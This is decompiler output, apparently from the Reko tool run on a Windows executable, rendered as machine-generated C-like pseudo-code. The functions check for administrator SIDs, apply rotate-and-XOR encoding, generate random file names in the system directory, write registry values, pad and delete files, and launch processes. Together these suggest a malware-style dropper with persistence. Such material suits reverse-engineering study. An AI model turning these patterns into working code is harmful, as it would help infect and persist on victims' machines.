// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040174B: void fn0040174B()
void fn0040174B()
{
}

// 0040174E: Register Eq_2 fn0040174E(Register (ptr Eq_3) ecx, Stack Eq_2 dwArg04, Stack (ptr Eq_2) dwArg08, Stack word32 dwArg0C, Register out ptr32 ecxOut, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
Eq_2 fn0040174E(Eq_3 * ecx, Eq_2 dwArg04, Eq_2 * dwArg08, word32 dwArg0C, ptr32 & ecxOut, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	ecx->t0000.u0 = 0x00;
	ecx->t0004.u0 = 0x00;
	ecx->t0008.u0 = 0x00;
	word32 ecx_31;
	*ecxOut = 0x04;
	ptr32 esp_111 = fp - 0x18;
	Eq_2 eax_203 = 0x80000000;
	word32 ebx_204 = 0x02;
	word32 dwLoc0C_205 = 0x04;
	if (dwArg0C == 0x00)
	{
		eax_203.u0 = 0xC0000000;
		ebx_204 = 0x04;
		dwLoc0C_205 = 0x02;
	}
	union Eq_2 * esp_113;
	Eq_2 eax_155;
	if (dwArg04 != 0x00)
	{
		Eq_2 eax_185 = CreateFileA(dwArg04, eax_203, 0x01, null, 0x03, 0x20, 0x00);
		ecx->t0000 = eax_185;
		esp_113 = fp - 0x34;
		if (eax_185 == ~0x00)
			goto l004017FF;
		Eq_2 eax_194 = GetFileSize(eax_185, fp - 0x08);
		ecx->t000C = eax_194;
		word32 ecx_189;
		*ecxOut = fp - 0x08;
		esp_111 = fp - 0x3C;
		if (false)
		{
l004017D2:
			esp_113 = esp_111 - 0x04;
			*esp_113 = (union Eq_2 *) ecx->t0000;
			CloseHandle(*esp_113);
			goto l004017FF;
		}
		word32 ecx_199;
		*ecxOut = dwArg08;
		if (dwArg08 != null)
			*dwArg08 = (union Eq_2 *) eax_194;
	}
	union Eq_2 * esp_127 = esp_111 - 0x04;
	*esp_127 = (union Eq_2 *) 0x00;
	*(esp_127 - 0x04) = 0x00;
	*(esp_127 - 0x08) = 0x00;
	*(esp_127 - 0x0C) = ebx_204;
	*(esp_127 - 0x10) = 0x00;
	*(esp_127 - 0x14) = (union Eq_2 *) ecx->t0000;
	Eq_2 eax_140 = CreateFileMappingA(*(esp_127 - 0x14), *(esp_127 - 0x10), *(esp_127 - 0x0C), *(esp_127 - 0x08), *(esp_127 - 0x04), *esp_127);
	ecx->t0004 = eax_140;
	esp_111 = esp_127 - 0x14;
	if (eax_140 != 0x00)
	{
		*(esp_127 - 0x18) = 0x00;
		*(esp_127 - 0x1C) = 0x00;
		*(esp_127 - 0x20) = 0x00;
		*(esp_127 - 0x24) = dwLoc0C_205;
		*(esp_127 - 0x28) = (union Eq_2 *) eax_140;
		eax_155 = MapViewOfFile(*(esp_127 - 0x28), *(esp_127 - 0x24), *(esp_127 - 0x20), *(esp_127 - 0x1C), *(esp_127 - 0x18));
		ecx->t0008 = eax_155;
		esp_113 = esp_127 - 0x28;
		if (eax_155 != 0x00)
		{
l00401801:
			struct Eq_255 * esp_71 = (char *) esp_113 + 0x04;
			word32 edi_70;
			*ediOut = *esp_113;
			word32 esi_72;
			*esiOut = esp_71->dw0000;
			word32 ebx_74;
			*ebxOut = esp_71->dw0004;
			return eax_155;
		}
		*(esp_127 - 44) = (union Eq_2 *) ecx->t0004;
		CloseHandle(*(esp_127 - 44));
		*(esp_127 - 0x30) = (union Eq_2 *) ecx->t0000;
		CloseHandle(*(esp_127 - 0x30));
		esp_113 = esp_127 - 0x30;
l004017FF:
		eax_155.u0 = 0x00;
		goto l00401801;
	}
	goto l004017D2;
}

// 00401808: Register word32 fn00401808(Register (ptr Eq_303) ecx, Register out ptr32 ediOut)
word32 fn00401808(Eq_303 * ecx, ptr32 & ediOut)
{
	struct Eq_303 * esi_31 = ecx;
	struct Eq_306 * esp_17 = fp - 0x08;
	Eq_2 eax_11 = ecx->t0008;
	if (eax_11 != 0x00)
	{
		UnmapViewOfFile(eax_11);
		esp_17 = fp - 0x0C;
	}
	Eq_2 eax_18 = ecx->t0004;
	if (eax_18 != 0x00)
	{
		esp_17 = esp_17 - 0x04;
		esp_17->t0000 = eax_18;
		CloseHandle(esp_17->t0000);
	}
	Eq_2 eax_24 = ecx->t0000;
	if (eax_24 != 0x00)
	{
		union Eq_2 * esp_48 = esp_17 - 0x04;
		*esp_48 = (union Eq_2 *) eax_24;
		CloseHandle(*esp_48);
	}
	esi_31->t0000 = esi_31->t0000 & 0x00;
	esi_31->t0004 = esi_31->t0004 & 0x00;
	esi_31->t0008 = esi_31->t0008 & 0x00;
	word32 edi_43;
	*ediOut = esp_17->t0000;
	return esp_17->dw0004;
}

// 00402680: Register word32 fn00402680(Stack (ptr word32) dwArg04, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn00402680(word32 * dwArg04, ptr32 & esiOut, ptr32 & ediOut)
{
	Eq_2 eax_16 = GetCurrentProcessId();
	*dwArg04 = 0x00;
	Eq_2 eax_41 = OpenProcess(0x001F0FFF, 0x00, eax_16);
	Eq_2 dwLoc0C_193 = 0x00;
	word32 dwLoc20_365 = 0x00;
	word32 * esp_107 = fp - 88;
	if (OpenProcessToken(eax_41, 0x08, fp - 0x14) == 0x00)
	{
l004026E3:
		GetLastError();
		goto l004026E9;
	}
	Eq_2 eax_244 = LocalAlloc(0x00, 0x32);
	esp_107 = fp - 0x60;
	dwLoc0C_193 = eax_244;
	if (eax_244 == 0x00)
		goto l004026E3;
	ptr32 esp_259 = fp - 116;
	if (GetTokenInformation(0x00, SLICE(0x00, TOKEN_INFORMATION_CLASS, 32), 0x02, eax_244, (DWORD *) 0x32) != 0x00)
	{
l00402757:
		PSID ** esp_304 = esp_259 - 0x04;
		*esp_304 = (PSID **) (fp - 0x1C);
		*(esp_304 - 0x04) = 0x00;
		*(esp_304 - 0x08) = 0x00;
		*(esp_304 - 0x0C) = 0x00;
		*(esp_304 - 0x10) = 0x00;
		*(esp_304 - 0x14) = 0x00;
		*(esp_304 - 0x18) = 0x00;
		*(esp_304 - 0x1C) = 0x00;
		*(esp_304 - 0x20) = 0x04;
		*(esp_304 - 0x24) = 0x01;
		*(esp_304 - 0x28) = fp - 44;
		if (AllocateAndInitializeSid(*(esp_304 - 0x28), *(esp_304 - 0x24), *(esp_304 - 0x20), *(esp_304 - 0x1C), *(esp_304 - 0x18), *(esp_304 - 0x14), *(esp_304 - 0x10), *(esp_304 - 0x0C), *(esp_304 - 0x08), *(esp_304 - 0x04), *esp_304) != 0x00)
		{
			*(esp_304 - 44) = fp - 0x18;
			*(esp_304 - 0x30) = 0x00;
			*(esp_304 - 0x34) = 0x00;
			*(esp_304 - 0x38) = 0x00;
			*(esp_304 - 0x3C) = 0x00;
			*(esp_304 - 0x40) = 0x00;
			*(esp_304 - 0x44) = 0x00;
			*(esp_304 - 0x48) = 0x00;
			*(esp_304 - 0x4C) = 0x06;
			*(esp_304 - 0x50) = 0x01;
			*(esp_304 - 0x54) = fp - 44;
			esp_107 = esp_304 - 0x54;
			if (AllocateAndInitializeSid(*(esp_304 - 0x54), *(esp_304 - 0x50), *(esp_304 - 0x4C), *(esp_304 - 0x48), *(esp_304 - 0x44), *(esp_304 - 0x40), *(esp_304 - 0x3C), *(esp_304 - 0x38), *(esp_304 - 0x34), *(esp_304 - 0x30), *(esp_304 - 44)) != 0x00)
			{
				uint32 dwArg04_360 = 0x00;
				if (*dwLoc0C_193 > 0x00)
				{
					word32 esi_378 = dwLoc0C_193 + 0x04;
					do
					{
						PSID * esp_385 = esp_107 - 0x04;
						*esp_385 = (PSID *) null;
						word32 eax_387 = *esi_378;
						*(esp_385 - 0x04) = eax_387;
						esp_107 = esp_385 - 0x04;
						if (EqualSid(*(esp_385 - 0x04), *esp_385) != 0x00)
						{
							*dwArg04 = 0x00;
							dwLoc20_365 = 0x01;
							break;
						}
						*(esp_385 - 0x08) = 0x00;
						*(esp_385 - 0x0C) = eax_387;
						esp_107 = esp_385 - 0x0C;
						if (EqualSid(*(esp_385 - 0x0C), *(esp_385 - 0x08)) != 0x00)
						{
							*dwArg04 = 0x01;
							dwLoc20_365 = 0x00;
							break;
						}
						uint32 v26_407 = dwArg04_360 + 0x01;
						dwArg04_360 = v26_407;
						esi_378 = esi_378 + 0x08;
					} while (v26_407 < *dwLoc0C_193);
				}
				if (*dwArg04 == 0x00 && dwLoc20_365 == 0x00)
					*dwArg04 = 0x01;
l00402803:
				if (0x00 != 0x00)
				{
					esp_107 = esp_107 - 0x04;
					*esp_107 = 0x00;
					FreeSid(*esp_107);
				}
				if (0x00 != 0x00)
				{
					PSID * esp_163 = esp_107 - 0x04;
					*esp_163 = (PSID *) null;
					FreeSid(*esp_163);
				}
				if (dwLoc0C_193 != 0x00)
				{
					esp_107 = esp_107 - 0x04;
					*esp_107 = (word32) dwLoc0C_193;
					LocalFree(*esp_107);
				}
				if (0x00 != 0x00)
				{
					esp_107 = esp_107 - 0x04;
					*esp_107 = 0x00;
					CloseHandle(*esp_107);
				}
				if (eax_41 != 0x00)
				{
					union Eq_2 * esp_139 = esp_107 - 0x04;
					*esp_139 = (union Eq_2 *) eax_41;
					CloseHandle(*esp_139);
				}
				struct Eq_905 * esp_128 = esp_107 + 0x01;
				word32 edi_127;
				*ediOut = *esp_107;
				word32 esi_129;
				*esiOut = esp_128->dw0000;
				return esp_128->dw0004;
			}
		}
		goto l00402791;
	}
	else
	{
		if (GetLastError() == 122)
		{
			LocalFree(eax_244);
			Eq_2 eax_430 = LocalAlloc(0x00, 0x32);
			dwLoc0C_193 = eax_430;
			if (eax_430 != 0x00)
			{
				esp_259 = fp - 0x94;
				if (GetTokenInformation(0x00, SLICE(0x00, TOKEN_INFORMATION_CLASS, 32), 0x02, eax_430, (DWORD *) 0x32) != 0x00)
					goto l00402757;
			}
		}
l00402791:
		GetLastError();
l004026E9:
		goto l00402803;
	}
}

// 0040347E: Register Eq_2 fn0040347E(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
Eq_2 fn0040347E(Eq_2 dwArg04, Eq_2 dwArg08)
{
	Eq_2 esi_26 = dwArg04;
	Eq_2 edi_10 = 0x00;
	if (dwArg08 > 0x00)
	{
		while (fn00407840(esi_26) != 0x00)
		{
			edi_10 = (word32) edi_10 + 0x01;
			esi_26 = (word32) fn00407840(esi_26) + ((word32) esi_26 + 0x01);
			if (edi_10 >= dwArg08)
				return esi_26;
		}
	}
	return esi_26;
}

// 004035A1: Register word32 fn004035A1(Register word32 esi, Register out ptr32 ediOut)
word32 fn004035A1(word32 esi, ptr32 & ediOut)
{
	struct Eq_956 * esp_14 = fp - 0x08;
	int32 edi_13 = 0x00;
	do
	{
		struct Eq_956 * esp_16 = esp_14 - 0x04;
		esp_16->dw0000 = 0x00;
		byte dl_33 = (byte) (uint32) ((uint64) (uint32) fn004047B6(dwArg00) % ((0x00 - (-edi_13 == 0x00) & 0xF8) + 0x08));
		byte * eax_36 = esp_16->dw000C + edi_13;
		*eax_36 = dl_33;
		esp_14 = esp_16;
		if (dl_33 == 0x00)
			*eax_36 = 0x01;
		edi_13 = edi_13 + 0x01;
	} while (edi_13 < 0x04);
	word32 edi_45;
	*ediOut = esp_16->dw0000;
	return esp_16->dw0004;
}

// 004035D8: void fn004035D8(Stack word32 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C, Stack byte bArg0F)
void fn004035D8(word32 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C, byte bArg0F)
{
	Eq_2 dwLoc0C_11 = dwLoc0C & 0x00;
	byte cl_20 = *dwArg0C;
	byte al_21 = *((word32) dwArg0C + 0x01);
	if (dwArg08 > 0x00)
	{
		do
		{
			ui8 * eax_78 = (word32) dwLoc0C_11 + dwArg04;
			*eax_78 = __rol(*eax_78, cl_20) ^ al_21;
			Eq_2 v18_123 = (word32) dwLoc0C_11 + 0x01;
			dwLoc0C_11 = v18_123;
		} while (v18_123 < dwArg08);
	}
}

// 00403634: void fn00403634(Stack Eq_2 dwArg04, Stack int32 dwArg08, Stack (ptr Eq_1053) dwArg0C, Stack byte bArg0F)
void fn00403634(Eq_2 dwArg04, int32 dwArg08, Eq_1053 * dwArg0C, byte bArg0F)
{
	int32 dwLoc0C_11 = dwLoc0C & 0x00;
	byte cl_20 = dwArg0C->b0000;
	byte al_21 = dwArg0C->b0001;
	if (dwArg08 > 0x00)
	{
		do
		{
			byte * eax_78 = (word32) dwArg04 + dwLoc0C_11;
			*eax_78 = __ror(*eax_78 ^ al_21, cl_20);
			int32 v18_123 = dwLoc0C_11 + 0x01;
			dwLoc0C_11 = v18_123;
		} while (v18_123 < dwArg08);
	}
}

// 00403690: Register byte fn00403690(Register int32 ebx, Stack Eq_2 dwArg00, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
byte fn00403690(int32 ebx, Eq_2 dwArg00, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	byte al_47;
	byte bl_27 = (byte) dwArg00;
	word32 * esp_105 = fp - 0x10;
	word32 esi_104 = (uint32) ((uint64) (uint32) fn004047B6(0x00) % 0x1A) + 0x61;
	if (dwArg00 != 0x04)
	{
		if (dwArg00 == 0x01)
		{
			esp_105 = fp - 0x14;
			al_47 = (byte) ((uint32) ((uint64) (uint32) fn004047B6(0x00) % 0x0A) + 0x30);
l0040372B:
			struct Eq_1133 * esp_52 = esp_105 + 0x01;
			word32 edi_51;
			*ediOut = *esp_105;
			word32 esi_53;
			*esiOut = esp_52->dw0000;
			word32 ebx_55;
			*ebxOut = esp_52->dw0004;
			return al_47;
		}
		if ((bl_27 & 0x02) != 0x00)
		{
			esp_105 = fp - 0x14;
			esi_104 = (uint32) ((uint64) (uint32) fn004047B6(0x00) % 0x1A) + 0x41;
		}
		word32 * esp_106 = esp_105 - 0x04;
		*esp_106 = 0x00;
		word32 * esp_115 = esp_106;
		if (((byte) fn004047B6(dwArg00) & 0x01) != 0x00 && (bl_27 & 0x04) != 0x00)
		{
			*(esp_106 - 0x04) = 0x00;
			uint64 edx_eax_162 = (uint64) (uint32) fn004047B6(dwArg00);
			*(esp_106 - 0x08) = 0x1A;
			esp_115 = esp_106 - 0x04;
			esi_104 = (uint32) (edx_eax_162 % *(esp_106 - 0x08)) + 0x61;
		}
		word32 * esp_121 = esp_115 - 0x04;
		*esp_121 = 0x00;
		esp_105 = esp_121;
		if (((byte) fn004047B6(dwArg00) & 0x01) != 0x00 && (bl_27 & 0x01) != 0x00)
		{
			*(esp_121 - 0x04) = 0x00;
			uint64 edx_eax_141 = (uint64) (uint32) fn004047B6(dwArg00);
			*(esp_121 - 0x08) = 0x0A;
			esp_105 = esp_121 - 0x04;
			esi_104 = (uint32) (edx_eax_141 % *(esp_121 - 0x08)) + 0x30;
		}
	}
	al_47 = (byte) esi_104;
	goto l0040372B;
}

// 0040372F: void fn0040372F(Register Eq_2 ebx, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C)
void fn0040372F(Eq_2 ebx, Eq_2 dwArg08, Eq_2 dwArg0C)
{
	struct Eq_1257 * esp_10 = fp - 0x0C;
	Eq_2 esi_15 = dwArg08;
	if (dwArg0C > dwArg08)
	{
		esp_10 = fp - 0x10;
		esi_15 = (uint32) ((uint64) (uint32) fn004047B6(0x00) % (dwArg0C - dwArg08)) + dwArg08;
	}
	int32 ebx_32 = esp_10->dw0010;
	if (esi_15 > 0x00)
	{
		do
		{
			*(esp_10 - 0x04) = esp_10->dw001C;
			Eq_1318 esi_70;
			Eq_1319 edi_71;
			byte al_72 = fn00403690(ebx_32, ebx, out ebx_32, out esi_70, out edi_71);
			*((word32) edi_71 + ebx_32) = al_72;
		} while ((word32) edi_71 + 0x01 < esi_70);
	}
	word32 * esp_41 = esp_10 - 0x04;
	*esp_41 = 0x02;
	byte * ebx_43;
	word32 esi_44;
	int32 edi_45;
	byte al_46 = fn00403690(ebx_32, ebx, out ebx_43, out esi_44, out edi_45);
	*ebx_43 = al_46;
	ebx_43[edi_45] = ebx_43[edi_45] & 0x00;
	*esp_41 = 0x01;
}

// 00403CE3: void fn00403CE3(Register word32 esi, Stack Eq_2 dwArg04)
void fn00403CE3(word32 esi, Eq_2 dwArg04)
{
	fn00407750(dwArg04);
	*(fp - 0x10) = fp->dw0008;
	*(fp - 0x14) = 4260434;
	*(fp - 0x18) = (union Eq_2 *) fn0040347E(dwArg00, dwArg04);
	*(fp - 0x1C) = fp->dw0004;
	fn00407760(dwArg00);
}

// 00403DC6: Register word32 fn00403DC6(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C, Register out ptr32 esiOut)
word32 fn00403DC6(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C, ptr32 & esiOut)
{
	ptr32 esp_27 = fp - 0x28;
	Eq_2 eax_29 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x02, 0x20, 0x00);
	if (eax_29 != ~0x00 && dwArg08 != 0x00)
	{
		WriteFile(eax_29, dwArg08, dwArg0C, fp + 0x04, null);
		CloseHandle(eax_29);
		esp_27 = fp - 0x40;
	}
	struct Eq_1410 * esp_49 = esp_27 + 0x04;
	word32 esi_50;
	*esiOut = esp_49->dw0000;
	return esp_49->dw0004;
}

// 00403E63: Register word32 fn00403E63(Stack Eq_2 dwArg04, Register out ptr32 ebxOut, Register out Eq_1424 esiOut)
word32 fn00403E63(Eq_2 dwArg04, ptr32 & ebxOut, Eq_1424 & esiOut)
{
	fn0040174B();
	word32 ecx_19;
	word32 ebx_20;
	word32 esi_21;
	word32 edi_22;
	if (fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x01, out ecx_19, out ebx_20, out esi_21, out edi_22) == 0x00)
		return 0x00;
	else
	{
		word32 edi_39;
		word32 esi_40;
		*esiOut = fn00401808(fp - 0x18, out edi_39);
		*(fp - 0x1C) = 0x01;
		return *(fp - 0x1C);
	}
}

// 00403F05: void fn00403F05(Stack Eq_2 dwArg04)
void fn00403F05(Eq_2 dwArg04)
{
	SetFileAttributesA(dwArg04, 0x20);
	DeleteFileA(0x20);
}

// 0040406E: Register word32 fn0040406E(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Register out ptr32 esiOut)
word32 fn0040406E(Eq_2 dwArg04, Eq_2 dwArg08, ptr32 & esiOut)
{
	union Eq_2 * esp_118 = fp - 0x14;
	if (dwArg08 >= 0x00015000)
	{
		SetFileAttributesA(dwArg04, 0x20);
		Eq_2 eax_120 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x03, 0x20, 0x00);
		esp_118 = fp - 0x38;
		Eq_2 edi_121 = eax_120;
		if (eax_120 != ~0x00)
		{
			ptr32 esp_153;
			Eq_2 eax_129 = GetFileSize(eax_120, fp - 0x08);
			if (eax_129 > dwArg08)
			{
				SetFilePointer(eax_120, dwArg08, null, 0x00);
				SetEndOfFile(eax_120);
				esp_153 = fp - 0x54;
			}
			else
			{
				SetFilePointer(eax_120, 0x00, null, 0x02);
				int32 eax_185 = dwArg08 - eax_129;
				ptr32 esp_181 = fp - 0x50;
				int32 eax_192 = (int32) ((int64) eax_185 / 0x00080000);
				if (eax_192 > 0x00)
				{
					int32 dwArg08_230 = eax_192;
					do
					{
						LPOVERLAPPED * esp_234 = esp_181 - 0x04;
						*esp_234 = (LPOVERLAPPED *) null;
						*(esp_234 - 0x04) = fp - 0x08;
						*(esp_234 - 0x08) = 0x00080000;
						*(esp_234 - 0x0C) = 4272592;
						*(esp_234 - 0x10) = (union Eq_2 *) eax_120;
						WriteFile(*(esp_234 - 0x10), *(esp_234 - 0x0C), *(esp_234 - 0x08), *(esp_234 - 0x04), *esp_234);
						int32 v20_245 = dwArg08_230 - 0x01;
						esp_181 = esp_234 - 0x10;
						dwArg08_230 = v20_245;
					} while (v20_245 != 0x00);
				}
				LPOVERLAPPED * esp_200 = esp_181 - 0x04;
				*esp_200 = (LPOVERLAPPED *) null;
				*(esp_200 - 0x04) = fp - 0x08;
				*(esp_200 - 0x08) = (int32) ((int64) eax_185 % 0x00080000);
				*(esp_200 - 0x0C) = 4272592;
				*(esp_200 - 0x10) = (union Eq_2 *) eax_120;
				WriteFile(*(esp_200 - 0x10), *(esp_200 - 0x0C), *(esp_200 - 0x08), *(esp_200 - 0x04), *esp_200);
			}
			union Eq_2 * esp_154 = esp_153 - 0x04;
			*esp_154 = (union Eq_2 *) edi_121;
			CloseHandle(*esp_154);
			*(esp_154 - 0x04) = 0x01;
			esp_118 = esp_154;
l00404133:
			struct Eq_1513 * esp_62 = (char *) esp_118 + 0x04;
			word32 esi_63;
			*esiOut = esp_62->dw0000;
			return esp_62->dw0004;
		}
	}
	goto l00404133;
}

// 0040464B: void fn0040464B(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C, Stack Eq_2 dwArg10)
void fn0040464B(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C, Eq_2 dwArg10)
{
	if (RegCreateKeyA(dwArg04, dwArg08, fp + 0x08) == 0x00)
	{
		RegSetValueExA(dwArg08, dwArg0C, 0x00, 0x01, dwArg10, fn00407840(dwArg10));
		RegCloseKey(dwArg08);
	}
}

// 00404691: Register word32 fn00404691(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C, Stack ptr32 dwArg10)
word32 fn00404691(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C, ptr32 dwArg10)
{
	word32 esi_113 = 0x00;
	struct Eq_1732 * esp_117 = fp - 288;
	if (RegOpenKeyA(dwArg04, dwArg08, fp - 0x08) == 0x00)
	{
		while (true)
		{
			union Eq_2 * esp_49 = esp_117 - 0x04;
			*esp_49 = (union Eq_2 *) 0x0104;
			*(esp_49 - 0x04) = fp - 0x0110;
			*(esp_49 - 0x08) = esi_113;
			*(esp_49 - 0x0C) = dwLoc08;
			esp_117 = esp_49 - 0x0C;
			Eq_2 eax_59 = RegEnumKeyA(*(esp_49 - 0x0C), *(esp_49 - 0x08), *(esp_49 - 0x04), *esp_49);
			if (eax_59 != 0x00)
				break;
			if (dwArg0C != eax_59)
			{
				ui32 v13_89 = dwLoc0C & eax_59;
				*(esp_49 - 0x10) = dwArg10;
				*(esp_49 - 0x14) = fp - 0x0C;
				*(esp_49 - 0x18) = fp - 0x0110;
				*(esp_49 - 0x1C) = (union Eq_2 *) dwArg08;
				*(esp_49 - 0x20) = (union Eq_2 *) dwArg04;
				dwLoc0C = v13_89;
				word32 esp_109;
				word32 ebp_110;
				byte SCZO_111;
				word32 eax_112;
				byte SZO_114;
				byte C_115;
				byte Z_116;
				dwArg0C();
				esp_117 = esp_109 + 0x14;
				if (v13_89 != 0x00)
					goto l00404701;
			}
			esi_113 = esi_113 + 0x01;
		}
		*(esp_49 - 0x10) = 0x01;
		esp_117 = esp_49 - 0x0C;
l00404701:
		esp_117 = esp_117 - 0x04;
		esp_117->dw0000 = dwLoc08;
		RegCloseKey(esp_117->dw0000);
	}
	return esp_117->dw0000;
}

// 0040470F: Register word32 fn0040470F(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C, Stack word32 dwArg10, Register out ptr32 esiOut)
word32 fn0040470F(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C, word32 dwArg10, ptr32 & esiOut)
{
	word32 ebx_112 = 0x00;
	struct Eq_1874 * esp_114 = fp - 2092;
	if (RegOpenKeyA(dwArg04, dwArg08, fp - 0x08) == 0x00)
	{
		while (true)
		{
			union Eq_2 * esp_62 = esp_114 - 0x04;
			*esp_62 = (union Eq_2 *) (fp - 0x0C);
			*(esp_62 - 0x04) = fp + ~0x0817;
			*(esp_62 - 0x08) = fp - 0x18;
			*(esp_62 - 0x0C) = 0x00;
			*(esp_62 - 0x10) = fp - 0x14;
			*(esp_62 - 0x14) = fp - 0x0418;
			*(esp_62 - 0x18) = ebx_112;
			*(esp_62 - 0x1C) = dwLoc08;
			esp_114 = esp_62 - 0x1C;
			Eq_2 eax_85 = RegEnumValueA(*(esp_62 - 0x1C), *(esp_62 - 0x18), *(esp_62 - 0x14), *(esp_62 - 0x10), *(esp_62 - 0x0C), *(esp_62 - 0x08), *(esp_62 - 0x04), *esp_62);
			if (eax_85 != 0x00)
				break;
			if (dwLoc18 == 0x01 && dwArg0C != eax_85)
			{
				ui32 v14_120 = dwLoc10 & eax_85;
				*(esp_62 - 0x20) = dwArg10;
				*(esp_62 - 0x24) = fp - 0x10;
				*(esp_62 - 0x28) = fp - 0x0418;
				*(esp_62 - 44) = (union Eq_2 *) dwArg08;
				*(esp_62 - 0x30) = (union Eq_2 *) dwArg04;
				dwLoc10 = v14_120;
				word32 esp_140;
				word32 ebp_141;
				byte SCZO_142;
				word32 eax_144;
				word32 esi_145;
				byte SZO_146;
				byte C_147;
				byte Z_148;
				dwArg0C();
				esp_114 = esp_140 + 0x14;
				if (v14_120 != 0x00)
					goto l004047A7;
			}
			ebx_112 = ebx_112 + 0x01;
		}
		*(esp_62 - 0x20) = 0x01;
		esp_114 = esp_62 - 0x1C;
l004047A7:
		esp_114 = esp_114 - 0x04;
		esp_114->dw0000 = dwLoc08;
		RegCloseKey(esp_114->dw0000);
	}
	word32 esi_44;
	*esiOut = esp_114->dw0000;
	return esp_114->dw0004;
}

// 004047B6: Register word32 fn004047B6(Stack Eq_2 dwArg04)
word32 fn004047B6(Eq_2 dwArg04)
{
	if (dwArg04 != 0x00 || globals->dw4131CC == 0x00)
	{
		fn00407F35(GetTickCount());
		globals->dw4131CC = fn00407F3F();
	}
	return fn00407F3F();
}

// 004047E2: Register ui32 fn004047E2(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Register out ptr32 esiOut)
ui32 fn004047E2(Eq_2 dwArg04, Eq_2 dwArg08, ptr32 & esiOut)
{
	fn004076F0(fp - 88, 0x00, 0x44);
	word32 esi_53;
	*esiOut = dwArg04;
	return 0x00 - (-CreateProcessA(dwArg04, dwArg08, null, null, 0x00, 0x00, 0x00, 0x00, fp - 88, fp - 0x14) == 0x00) & dwLoc14;
}

// 00404A18: void fn00404A18(Register Eq_2 ebx, Register ptr32 ebp, Register word32 esi)
void fn00404A18(Eq_2 ebx, ptr32 ebp, word32 esi)
{
	word32 esi_164;
	if (globals->t4938F0 == null)
		esi_164 = fn00404691(0x80000002, fn0040347E(4260434, 0x04), 0x0040494A, fp - 0x08);
	else
	{
		fn00403CE3(esi, fp - 0x041C);
		*(fp - 0x052C) = fp - 0x041C;
		*(fp - 0x0530) = 4797664;
		fn00407750(dwArg00);
		*(fp - 1332) = fp - 0x08;
		*(fp - 1336) = 0x004048B6;
		*(fp - 0x053C) = fp - 0x041C;
		*(fp - 0x0540) = 0x80000002;
		ebx = fn0040470F(dwArg00, dwArg04, dwArg08, dwArg0C, out esi_164);
	}
	globals->dw4938F4 = dwLoc08 & 0x00;
	ptr32 esp_146 = fp - 0x0520;
	if ((dwLoc08 & 0x00) == 0x00)
	{
		*(fp - 1316) = esi_164;
		*(fp - 0x0528) = 0x0104;
		*(fp - 0x052C) = fp - 0x0520;
		GetSystemDirectoryA(*(fp - 0x052C), *(fp - 0x0528));
		do
		{
			*(fp - 0x1C) = *(fp - 0x1C) & 0x00;
			*(fp - 0x0530) = 0x0041078D;
			*(fp - 1332) = fp - 0x1C;
			fn00407750(dwArg00);
			*(fp - 0x0530) = 0x04;
			*(fp - 1332) = 0x04;
			*(fp - 1336) = 0x02;
			*(fp - 0x053C) = fp - 0x1C;
			*(fp - 0x053C) = (word32) fn00407840(dwArg00) + (fp - 0x1C);
			fn0040372F(ebx, dwArg04, dwArg08);
			*(fp - 0x0540) = fp - 0x1B;
			fn0040C9AC(fp - 0x04, dwArg00);
			*(fp - 0x0544) = fp - 0x0520;
			*(fp - 0x0548) = fp - 0x041C;
			fn00407750(dwArg00);
			*(fp - 0x054C) = 0x0040F044;
			*(fp - 0x0550) = fp - 0x041C;
			fn00407760(dwArg00);
			*(fp - 0x0554) = fp - 0x1C;
			*(fp - 0x0558) = fp - 0x041C;
			fn00407760(dwArg00);
			*(fp - 0x055C) = 0x004101DC;
			*(fp - 0x0560) = fp - 0x041C;
			fn00407760(dwArg00);
			*(fp - 0x0564) = fp - 0x041C;
			int32 esi_125;
		} while (fn00403E63(dwArg00, out ebx, out esi_125) != 0x00 && esi_125 < ~0x08);
		*(fp - 0x0530) = fp - 0x1C;
		*(fp - 1332) = 4797404;
		fn00407760(dwArg00);
		*(fp - 1336) = fp - 0x041C;
		*(fp - 0x053C) = 4797924;
		fn00407750(dwArg00);
		esp_146 = fp - 0x0528;
	}
	*(esp_146 - 0x04) = 0x01;
}

// 00404C49: Register word32 fn00404C49(Register ptr32 ebp, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn00404C49(ptr32 ebp, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	*ebxOut = ebx;
	word32 edi_16;
	*ediOut = fn00407750(fp - 0x0310);
	Eq_2 ecx_21 = *(fp - 0x041C);
	*(fp - 0x041C) = 0x0104;
	*(fp - 0x0420) = fp - 0x0108;
	*(fp - 0x0424) = 0x00;
	GetModuleFileNameA(*(fp - 0x0424), *(fp - 0x0420), *(fp - 0x041C));
	*(fp - 0x0428) = 0x00;
	*(fp - 0x042C) = 0x00;
	*(fp - 0x0430) = fp - 0x0414;
	*(fp - 0x0434) = 0x00;
	*(fp - 1080) = fp - 0x0310;
	Eq_2 ecx_50 = fn004078BB(ecx_21, dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10);
	*(fp - 0x043C) = 0x00;
